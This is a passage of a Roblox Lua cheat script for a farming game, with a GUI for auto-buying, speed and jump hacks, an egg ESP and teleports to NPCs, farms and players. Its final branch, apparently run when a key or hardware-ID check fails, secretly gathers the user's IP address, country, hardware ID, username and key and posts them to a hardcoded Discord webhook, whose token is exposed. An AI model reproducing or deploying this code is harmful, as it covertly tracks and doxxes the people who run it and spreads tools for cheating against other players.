                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyCosmeticCrate"):FireServer(unpack(args))
                elseif is_cosmetic_stock(choosedCosmeticToBuy) == false then
                    BuyCosmeticButton:SetText(choosedCosmeticToBuy.." is out of stock...")
                    wait(2)
                    BuyCosmeticButton:SetText("Buy")
                end
            end,
        })

        misc_tab:CreateSection({
            name = "Codes"
        })

        misc_tab:CreateButton({
            name = "Redeem codes",
            callback = function()
                local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
                for i,v in pairs(t2:GetData().ClaimedCodes) do
                    if v == false then
                        local args = {
                            "ClaimCode",
                            i
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("ClaimableCodeService"):FireServer(unpack(args))
                    end
                end
            end
        })

        misc_tab:CreateSection({
            name = "UI",
        })

        local SeedShopExitFix
        misc_tab:CreateButton({
            name = "Open Seed shop",
            callback = function()
                myplayer.PlayerGui["Seed_Shop"].Enabled = true
                if SeedShopExitFix == nil then
                    SeedShopExitFix = myplayer.PlayerGui["Seed_Shop"].Frame.Frame.ExitButton.MouseButton1Down:Connect(function()
                        myplayer.PlayerGui["Seed_Shop"].Enabled = false
                    end)
                end
            end,
        })

        local GearShopExitFix;
        misc_tab:CreateButton({
            name = "Open Gear shop",
            callback = function()
                myplayer.PlayerGui["Gear_Shop"].Enabled = true
                if GearShopExitFix == nil then
                    GearShopExitFix = myplayer.PlayerGui["Gear_Shop"].Frame.Frame.ExitButton.MouseButton1Down:Connect(function()
                        myplayer.PlayerGui["Gear_Shop"].Enabled = false
                    end)
                end
            end,
        })

        local DailyQuestsExitFix;
        misc_tab:CreateButton({
            name = "Open Daily quests",
            callback = function()
                myplayer.PlayerGui["DailyQuests_UI"].Enabled = true
                if DailyQuestsExitFix == nil then
                    DailyQuestsExitFix = myplayer.PlayerGui["DailyQuests_UI"].Frame.Frame.ExitButton.MouseButton1Down:Connect(function()
                        myplayer.PlayerGui["DailyQuests_UI"].Enabled = false
                    end)
                end
            end,
        })

        misc_tab:CreateButton({
            name = "Open Cosmetic shop",
            callback = function()
                myplayer.PlayerGui["CosmeticShop_UI"].Enabled = true
            end,
        })

        local PetInfoExitFix;
        misc_tab:CreateButton({
            name = "Open Pet info",
            callback = function()
                myplayer.PlayerGui["PetEquipSlots_UI"].Enabled = true
                if PetInfoExitFix == nil then
                    PetInfoExitFix = myplayer.PlayerGui["PetEquipSlots_UI"].Main.Main.Header.Exit.SENSOR.MouseButton1Down:Connect(function()
                        myplayer.PlayerGui["PetEquipSlots_UI"].Enabled = false
                    end)
                end
            end,
        })

        local HoneyShopExitFix;
        misc_tab:CreateButton({
            name = "Open Honey shop",
            callback = function()
                myplayer.PlayerGui["HoneyEventShop_UI"].Enabled = true
                if HoneyShopExitFix == nil then
                    HoneyShopExitFix = myplayer.PlayerGui["HoneyEventShop_UI"].Frame.Frame.ExitButton.MouseButton1Down:Connect(function()
                        myplayer.PlayerGui["HoneyEventShop_UI"].Enabled = false
                    end)
                end
            end,
        })


        local tab = lib:CreateTab({
            name = "Player"
        })

        tab:CreateSection({
            name = "Modification"
        })

        local WalkSpeedToggle;
        tab:CreateToggle({
            name = "Enable speed",
            default = false,
            callback = function(bool)
                WalkSpeedToggle = bool
                if bool == false then
                    if myplayer.Character.Humanoid.WalkSpeed ~= 16 then
                        myplayer.Character.Humanoid.WalkSpeed = 16
                    end
                end
            end,
        }):AddKeybind()

        local WalkSpeedSliderVal;
        tab:CreateSlider({
            name = "Walk speed",
            default = 16,
            Max = 200,
            Min = 16,
            callback = function(value)
                WalkSpeedSliderVal = value
            end,
        })

        spawn(function()
            while wait() do
                if WalkSpeedToggle then
                    if WalkSpeedSliderVal ~= nil then
                        if myplayer.Character.Humanoid.WalkSpeed ~= WalkSpeedSliderVal then
                            myplayer.Character.Humanoid.WalkSpeed = WalkSpeedSliderVal
                        end
                    end
                end
            end
        end)

        local JumpPowerToggle;
        tab:CreateToggle({
            name = "Enable Jump Power",
            default = false,
            callback = function(bool)
                JumpPowerToggle = bool
                if bool == false then
                    if myplayer.Character.Humanoid.JumpPower ~= 50 then
                        myplayer.Character.Humanoid.JumpPower = 50
                    end
                end
            end,
        }):AddKeybind()

        local JumpPowerVal;
        tab:CreateSlider({
            name = "Jump Power",
            default = 50,
            Max = 200,
            Min = 50,
            callback = function(value)
                JumpPowerVal = value
            end,
        })

        spawn(function()
            while wait() do
                if JumpPowerToggle then
                    if JumpPowerVal ~= nil then
                        if myplayer.Character.Humanoid.JumpPower ~= JumpPowerVal then
                            myplayer.Character.Humanoid.JumpPower = JumpPowerVal
                        end
                    end
                end
            end
        end)

        tab:CreateSection({
            name = "Visual"
        })

        local ESPeggPetToggle;
        tab:CreateToggle({
            name = "Show Egg's Pet",
            default = false,
            callback = function(bool)
                ESPeggPetToggle = bool
                if bool == false then
                    for i,v in pairs(get_my_farm().Important.Objects_Physical:GetDescendants()) do
                        if v.Name == "MementoMoriESP" then
                            v:Destroy()
                        end
                    end
                end
            end,
        })

        spawn(function()
            while wait() do
                if ESPeggPetToggle then
                    for i,v in pairs(get_my_farm().Important.Objects_Physical:GetChildren()) do
                        if v:IsA("Model") and v:GetAttribute("OBJECT_TYPE") == "PetEgg" and v:GetAttribute("READY") == true and v:GetAttribute("OBJECT_UUID") ~= nil then
                            local uuid = v:GetAttribute("OBJECT_UUID")
                            local petname = get_pet_from_egguuid(uuid)
                            if petname ~= nil then
                                local part = v:FindFirstChildWhichIsA("Part")
                                if part:FindFirstChild("MementoMoriESP") == nil then
                                    local bilboard = Instance.new("BillboardGui", part)
                                    bilboard.Name = "MementoMoriESP"
                                    bilboard.Size = UDim2.new(1,0,1,0)
                                    bilboard.AlwaysOnTop = true

                                    local text = Instance.new("TextLabel", bilboard)
                                    text.Size = UDim2.new(1,0,1,0)
                                    text.Text = petname
                                    text.TextSize = 25
                                    text.TextColor3 = Color3.new(255,255,255)
                                    text.TextStrokeColor3 = Color3.new(0,0,0)
                                    text.TextStrokeTransparency = 0
                                    text.BackgroundTransparency = 1
                                end
                            end
                        end
                    end
                end
            end
        end)

        local tab_teleport = lib:CreateTab({
            name = "Teleport"
        })

        tab_teleport:CreateSection({
            name = "NPCs",
        })

        local function getNPCs()
            local temp = {}
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v:IsA("Model") then
                    if v:FindFirstChild("Head") or v:FindFirstChild("HumanoidRootPart") or v:FindFirstChild("RootPart") then
                        for i2,v2 in pairs(v:GetChildren()) do
                            if v2:FindFirstChildWhichIsA("ProximityPrompt") then
                                if game:GetService("Players"):FindFirstChild(v.Name) == nil then
                                    table.insert(temp, v.Name)
                                end
                            end
                        end
                    end
                end
            end
            return temp
        end

        local choosenNPC;
        local NPCTeleportDropdown;
        NPCTeleportDropdown = tab_teleport:CreateDropdown({
            name = "NPCs",
            options = getNPCs(),
            callback = function(option)
                choosenNPC = option[1]
            end,
        })

        tab_teleport:CreateButton({
            name = "Refresh",
            callback = function()
                NPCTeleportDropdown:Refresh(getNPCs())
            end
        })

        local function NPCnameToPosition(name)
            for i,v in pairs(game.workspace:GetDescendants()) do
                if v.Name == name then
                    if v:IsA("Model") and game:GetService("Players"):FindFirstChild(name) == nil then
                        for i2,v2 in pairs(v:GetDescendants()) do
                            if v2:IsA("ProximityPrompt") then
                                if v2.Parent:IsA("Part") or v2.Parent:IsA("BasePart") then
                                    local part = v2.Parent
                                    return part.Position
                                end
                            end
                        end
                    end
                end
            end
        end

        local PositionXOffset = 5
        local PositionYOffset = 0
        local PositionZOffset = 0

        local teleportNPCbutton;
        teleportNPCbutton = tab_teleport:CreateButton({
            name = "Teleport",
            callback = function()
                if choosenNPC == nil then return end
                if NPCnameToPosition(choosenNPC) ~= nil then
                    local position_npc = NPCnameToPosition(choosenNPC)
                    myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(position_npc.X + PositionXOffset, position_npc.Y + PositionYOffset, position_npc.Z + PositionZOffset)
                else
                    teleportNPCbutton:SetText("Couldn't fetch NPC's part...")
                    wait(2)
                    teleportNPCbutton:SetText("Teleport")
                end
            end,
        })

        tab_teleport:CreateSection({
            name = "Places"
        })

        local function get_places()
            local t = {"Bee Swarm"}
            for i,v in pairs(game:GetService("Workspace").NPCS:GetChildren()) do
                if v:IsA("Model") then
                    if v:FindFirstChild("Humanoid") == nil and v:FindFirstChildWhichIsA("Part") then
                        table.insert(t, v.Name)
                    end
                end
            end
            return t
        end

        local Places_To_Location = {["Bee Swarm"] = Vector3.new(-100.98680877685547, 4.00001335144043, -6.241497993469238)}

        local choosenPlace;
        tab_teleport:CreateDropdown({
            name = "Place",
            multiple = false,
            options = get_places(),
            callback = function(option)
                choosenPlace = option[1]
            end,
        })

        tab_teleport:CreateButton({
            name = "Teleport",
            callback = function()
                if choosenPlace == nil then return end
                local found_in_folder;
                for i,v in pairs(game:GetService("Workspace").NPCS:GetChildren()) do
                    if v.Name == choosenPlace then
                        found_in_folder = true
                        local part = v:FindFirstChildWhichIsA("Part").Position
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(part.X + PositionXOffset, myplayer.Character.HumanoidRootPart.Position.Y + PositionYOffset, part.Z + PositionZOffset)
                    end
                end
                if found_in_folder ~= true then
                    if Places_To_Location[choosenPlace] ~= nil then
                        local pos = Places_To_Location[choosenPlace]
                        myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos.X + PositionXOffset, pos.Y + PositionYOffset, pos.Z + PositionZOffset)
                    end
                end
            end,
        })

        tab_teleport:CreateSection({
            name = "Farms",
        })


        local function getFarms()
            local temp = {}
            for i,v in pairs(game:GetService("Workspace").Farm:GetDescendants()) do
                if v.Name == "Owner" and v:IsA("StringValue") then
                    if string.len(v.Value) ~= 0 then
                        table.insert(temp, v.Value)
                    end
                end
            end
            return temp
        end

        local choosenFarm;
        local TeleportFarmsDropdown;
        TeleportFarmsDropdown = tab_teleport:CreateDropdown({
            name = "Farms",
            options = getFarms(),
            callback = function(option)
                choosenFarm = option[1]
            end,
        })

        tab_teleport:CreateButton({
            name = "Refresh",
            callback = function()
                TeleportFarmsDropdown:Refresh(getFarms())
            end
        })

        local function getFarm(pName)
            for i,v in pairs(game:GetService("Workspace").Farm:GetDescendants()) do
                if v.Name == "Owner" and v:IsA("StringValue") then
                    if v.Value == pName then
                        return v.Parent.Parent.Parent.Spawn_Point
                    end
                end
            end
        end

        tab_teleport:CreateButton({
            name = "Teleport",
            callback = function()
                if choosenFarm == nil then return end
                if getFarm(choosenFarm) == nil then return end
                local position_farm = getFarm(choosenFarm).Position
                myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(position_farm.X + PositionXOffset, position_farm.Y + PositionYOffset, position_farm.Z + PositionZOffset)
            end,
        })

        tab_teleport:CreateSection({
            name = "Players",
        })

        local choosenPlayer;
        tab_teleport:CreateTextbox({
            name = "Player",
            placeholder = "Player name...",
            callback = function(value)
                choosenPlayer = value
            end,
        })

        local function string_toPlayer(str)
            local pCharacter;
            for i,v in pairs(game:GetService("Players"):GetChildren()) do
                if str == v.Name then
                    if v ~= myplayer then
                        pCharacter = v.Character
                    end
                end
            end
            if pCharacter == nil then
                for i,v in pairs(game:GetService("Players"):GetChildren()) do
                    if string.find(v.Name, str) then
                        pCharacter = v.Character
                    end
                end
            end
            return pCharacter
        end

        tab_teleport:CreateButton({
            name = "Teleport",
            callback = function()
                if choosenPlayer == nil then return end
                local player_character = string_toPlayer(choosenPlayer)
                if player_character ~= nil then
                    local position_player = player_character.HumanoidRootPart.Position
                    myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(position_player.X + PositionXOffset, position_player.Y + PositionYOffset, position_player.Z + PositionZOffset)
                end
            end,
        })



        tab_teleport:CreateSection({
            name = "Teleport settings"
        })

        tab_teleport:CreateSlider({
            name = "X Offset",
            default = 5,
            Max = 15,
            Min = 0,
            callback = function(value)
                PositionXOffset = value
            end,
        })
        tab_teleport:CreateSlider({
            name = "Y Offset",
            default = 0,
            Max = 15,
            Min = 0,
            callback = function(value)
                PositionYOffset = value
            end,
        })
        tab_teleport:CreateSlider({
            name = "Z Offset",
            default = 0,
            Max = 15,
            Min = 0,
            callback = function(value)
                PositionZOffset = value
            end,
        })


        local settings_tab = lib:CreateTab({
            name = "Settings"
        })

        settings_tab:CreateKeybind({
            name = "Hide UI",
            default = Enum.KeyCode.F5,
            callback = function()
                lib:Hide()
            end,
        })

        settings_tab:CreateSection({
            name = "Server",
        })

        settings_tab:CreateButton({
            name = "Server Hop",
            callback = function()
                local TeleportService = game:GetService("TeleportService")
                local HttpService = game:GetService("HttpService")

                local Servers = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                local Server, Next = nil, nil
                local function ListServers(cursor)
                    local Raw = game:HttpGet(Servers .. ((cursor and "&cursor=" .. cursor) or ""))
                    return HttpService:JSONDecode(Raw)
                end

                repeat
                    local Servers = ListServers(Next)
                    Server = Servers.data[math.random(1, (#Servers.data / 3))]
                    Next = Servers.nextPageCursor
                until Server

                if Server.playing < Server.maxPlayers and Server.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id, game.Players.LocalPlayer)
                end
            end
        })

        settings_tab:CreateButton({
            name = "Rejoin",
            callback = function()
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, myplayer)
            end
        })
    end
else
    local Webhook = "https://discord.com/api/webhooks/1384281909583941783/-65C7lru9jCBQxI4zzGaA6Z-wHlEoGxQOgCEnMttzppML7G1u54qdXTnNg6XRd6NZ6FL" -- your webhook

    local player = game:GetService"Players".LocalPlayer
    local joinTime = os.time() - (player.AccountAge*86400)
    local joinDate = os.date("!*t", joinTime)
    local premium = false
    local alt = true
    if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
    end

    if player.AccountAge <= 365 then
        alt = "Possible"
    elseif player.AccountAge >= 365 and premium == true then
        alt = "No"
    else
    alt = "Maybe"
    end
    local executor = identifyexecutor() or "Unknown"
    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
    local AvatarImage = Thing.imageUrl
    local get_ip = game:HttpGet("https://api.ipify.org")
    local loc_salt = game:HttpGet("https://api.iplocation.net/?ip="..get_ip)
    local loc = game:GetService("HttpService"):JSONDecode(loc_salt)['country_name']
    loc_salt = nil
    local msg = {
    ["content"] = "<@&1381337139869913138>",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0xed0909")), --decimal
            ["title"] = "A user has failed executing your script.",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                    {
                    ["name"] = "Account Information",
                    ["value"] = "- Username: ||"..player.Name.."||\n- UID: ||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                    ["inline"] = false
                    },
                    {
                    ["name"] = "Game",
                    ["value"] = "- Game ID: ["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")\n- Game Name: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = false
                    },
                    {
                    ["name"] = "Security",
                    ["value"] = "- Used Executor: "..executor.."\n- Alt: "..alt.."\n- Account Age: "..player.AccountAge.." Day(s)".."\n- Join Date: "..joinDate.day.."/"..joinDate.month.."/"..joinDate.year.."\n- HWID: "..gethwid().."("..real_hwid..")".."\n- Correct HWID: "..real_hwid.."\n- Key: ".._G.Key,
                    ["inline"] = false
                    },
                    {
                        ["name"] = "Geolocation",
                        ["value"] = "- IP: "..get_ip.."\n- Location: "..loc,
                        ["inline"] = false
                    }
            },
            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
    }

    local request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    request = nil
    Webhook = nil
    msg = nil
    Thing = nil
    get_ip = nil
    loc = nil
    real_hwid = ""
    codedHwid = ""
    count = 9999
end